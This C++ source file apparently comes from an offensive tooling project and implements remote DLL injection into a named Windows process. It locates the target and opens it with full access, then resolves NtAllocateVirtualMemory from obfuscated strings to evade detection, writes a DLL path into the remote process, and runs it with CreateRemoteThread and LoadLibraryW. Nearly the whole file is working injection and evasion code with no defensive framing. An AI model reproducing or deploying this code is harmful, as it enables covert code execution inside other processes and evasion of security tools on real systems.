LPVOID rockyVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	// Deobfuscate ntdll.dll
	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();

	// Get the Module handle for ntdll.dll
	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		return NULL; // Return NULL if ntdll.dll cannot be found
	}

	// Deobfuscate NtAllocateVirtualMemory
	std::string deobbed_ntallocmem = rockyGetString(str_NtAllocateVirtualMemory, big_string, sizeof(str_NtAllocateVirtualMemory));
	const char* deobbed_allocate_virtual_memory = deobbed_ntallocmem.c_str();

	// Get the NtAllocateVirtualMemory function from the NTDLL module
	s_NtAllocateVirtualMemory rockyAllocateVirtualMemory = (s_NtAllocateVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_allocate_virtual_memory);
	if (rockyAllocateVirtualMemory == NULL) {
		return NULL; // Return NULL if the function is not found
	}

	PVOID baseAddress = lpAddress;
	SIZE_T regionSize = dwSize;

	// Call NtAllocateVirtualMemory
	NTSTATUS status = rockyAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, flAllocationType, flProtect);

	if (status != STATUS_SUCCESS) {
		return NULL; // Return NULL on failure
	}

	return baseAddress; // Return the allocated memory address on success
}



BOOL rockyWriteToProcessMemory(HANDLE hProcess, PVOID address, PVOID data, SIZE_T size, SIZE_T* bytesWritten) {
	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
	if (ntdllHandle == NULL) {
		std::cerr << "Failed to get handle for ntdll.dll" << std::endl;
		return FALSE;
	}

	s_NtWriteVirtualMemory NtWriteVirtualMemory =
		(s_NtWriteVirtualMemory)GetProcAddress(ntdllHandle, "NtWriteVirtualMemory");

	if (NtWriteVirtualMemory == NULL) {
		std::cerr << "Failed to retrieve the address for NtWriteVirtualMemory" << std::endl;
		return FALSE;
	}

	NTSTATUS status = NtWriteVirtualMemory(hProcess, address, data, size, bytesWritten);

	if (status != STATUS_SUCCESS) {
		std::cerr << "NtWriteVirtualMemory failed with status: " << status << std::endl;
		return FALSE;
	}

	return TRUE;
}



/* Function that will inject a DLL, DLLName, into a remote process of handle */
BOOL rockyInjectDLL(HANDLE hProcess, LPWSTR DllName) {
	BOOL		bSTATE = TRUE;
	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;
	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T		lpNumberOfBytesWritten = NULL;
	HANDLE		hThread = NULL;

	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	if (hKernel32 == NULL) {
		printf("[!] GetModuleHandle failed with error: %d \n", GetLastError());
		return FALSE;
	}

	pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndInjection;
	}
	pAddress = rockyVirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		rockyPrintColor(red, "rockyVirtualAllocEx Failed: %d \n", GetLastError());
		bSTATE = FALSE; goto _EndInjection;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %lu\n", pAddress, (unsigned long)dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	(void)getchar();


	// Writing DllName to the allocated memory pAddress
	if (!rockyWriteToProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		rockyPrintColor(red, "rockyWriteProcessMemory Failed: %d \n", GetLastError());
		bSTATE = FALSE; goto _EndInjection;
	}
	printf("[i] Successfully Written %zu Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	(void)getchar();

	// Running LoadLibraryW in a new thread, passing pAddress as a parameter which contains the DLL name
	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndInjection;
	}
	rockyPrintColor(green, "DONE!!\n");

_EndInjection:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;

}



// Gets the process handle of a process of name, szProcessName



BOOL rockyGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc;
	Proc.dwSize = sizeof(PROCESSENTRY32);

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, sizeof(LowerName));

			// Converting each charachter in Proc.szExeFile to a lowercase character and saving it
			// in LowerName to perform the wcscmp call later

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// Compare the enumerated process path with what is passed

		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the process ID 
			*dwProcessId = Proc.th32ProcessID;
			// Open a process handle and return
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
		// While we can still have a valid output ftom Process32Next, continue looping
	} while (Process32Next(hSnapShot, &Proc));



_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}


